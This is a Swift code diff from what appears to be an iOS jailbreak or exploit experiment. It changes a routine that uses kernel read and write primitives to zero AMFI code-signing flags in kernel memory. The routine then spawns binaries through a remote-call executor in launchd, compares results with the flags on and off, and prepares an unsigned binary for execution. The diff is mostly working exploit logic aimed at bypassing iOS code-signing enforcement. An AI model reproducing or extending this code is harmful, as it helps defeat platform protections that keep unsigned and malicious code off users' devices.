@@ -7236,9 +7236,10 @@ struct AMFIExperimentView: View {
         // ============================================================
         detail += "=== Step 0: Verify paths (open test) ===\n"
 
-        // access() returns -1 in launchd RC context (symbol not resolved properly)
-        // Use open(O_RDONLY) instead — proven to work in this project
-        let testPaths = ["/usr/bin/id", "/bin/ls", "/bin/sh", "/usr/bin/uname"]
+        // On iOS 18, small binaries like /usr/bin/id, /bin/ls are in shared cache
+        // and DON'T exist as standalone files on disk!
+        // Use /usr/libexec/amfid which is proven to be openable from launchd RC.
+        let testPaths = ["/usr/libexec/amfid", "/usr/bin/id", "/bin/ls", "/bin/sh"]
         var validPath: String? = nil
 
         for path in testPaths {
@@ -7255,9 +7256,53 @@ struct AMFIExperimentView: View {
         }
         detail += "\n"
 
-        // Even if open fails (sandbox), we know these paths exist on iOS
-        // Proceed with /usr/bin/id as default
-        let spawnPath = validPath ?? "/usr/bin/id"
+        guard let spawnPath = validPath else {
+            detail += "❌ No openable binary found! Cannot proceed.\n"
+            detail += "Falling back to fork+execve only (no copy test).\n\n"
+
+            // Still do the flag disable + fork+execve test
+            detail += "=== Fallback: Disable flags + fork+execve ===\n"
+            var originalValues: [(offset: UInt64, value: UInt64)] = []
+            for off in flagOffsets {
+                let addr = amfiDataSlid &+ off
+                let val = ds_kread64_safe(addr)
+                originalValues.append((off, val))
+                ds_kwrite64(addr, 0)
+            }
+            detail += "Flags disabled: 10/10\n\n"
+
+            // Baseline: fork+execve trusted binary WITH flags enabled
+            // (can't do baseline because flags already disabled — restore first)
+            for (off, origVal) in originalValues { ds_kwrite64(amfiDataSlid &+ off, origVal) }
+            detail += "--- [baseline] fork+execve /usr/bin/id (flags ON) ---\n"
+            let bl = forkExecAndCapture(rc: rc, binaryPath: "/usr/bin/id", mem: mem)
+            detail += bl.log + "\n"
+
+            // Now disable again
+            for off in flagOffsets { ds_kwrite64(amfiDataSlid &+ off, 0) }
+            detail += "--- [test] fork+execve /usr/bin/id (flags OFF) ---\n"
+            let t1 = forkExecAndCapture(rc: rc, binaryPath: "/usr/bin/id", mem: mem)
+            detail += t1.log + "\n"
+
+            // Restore
+            for (off, origVal) in originalValues { ds_kwrite64(amfiDataSlid &+ off, origVal) }
+            detail += "Flags restored.\n\n"
+
+            detail += "=== VERDICT ===\n"
+            detail += "Baseline: \(bl.success ? "✅" : "❌") (signal=\(bl.signal), code=\(bl.exitCode))\n"
+            detail += "Test:     \(t1.success ? "✅" : "❌") (signal=\(t1.signal), code=\(t1.exitCode))\n\n"
+
+            if bl.success && t1.success {
+                detail += "⚠️ Both work — fork+execve trusted binary works regardless of flags.\n"
+                detail += "Need unsigned binary test to confirm AMFI bypass.\n"
+            } else if !bl.success && t1.success {
+                detail += "🎉 Flags make a difference! Trusted binary only works with flags OFF.\n"
+            } else {
+                detail += "Both same result — flags don't affect fork+execve of trusted binary.\n"
+            }
+
+            return ExperimentResult(name: expName, success: t1.success && !bl.success, detail: detail, timestamp: Date())
+        }
         detail += "Using: \(spawnPath)\n\n"
 
         // ============================================================
@@ -7322,9 +7367,14 @@ struct AMFIExperimentView: View {
         RootExecutor.rcall(rc, "chmod", dstPath, 0o755)
         detail += "chmod 755 done\n\n"
 
-        // Verify unsigned binary exists
-        let accessUnsigned = RootExecutor.rcall(rc, "access", dstPath, 0)
-        detail += "access(\(dstPathStr)): \(accessUnsigned == 0 ? "EXISTS ✅" : "FAIL ❌")\n\n"
+        // Verify unsigned binary exists via open
+        let verifyFd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_RDONLY), 0)
+        if verifyFd != UInt64(bitPattern: -1) {
+            detail += "Verify \(dstPathStr): EXISTS ✅\n\n"
+            RootExecutor.rcall(rc, "close", verifyFd)
+        } else {
+            detail += "Verify \(dstPathStr): FAIL ❌\n\n"
+        }
 
         // ============================================================
         // Step 2: BASELINE — fork+execve WITHOUT disabling flags
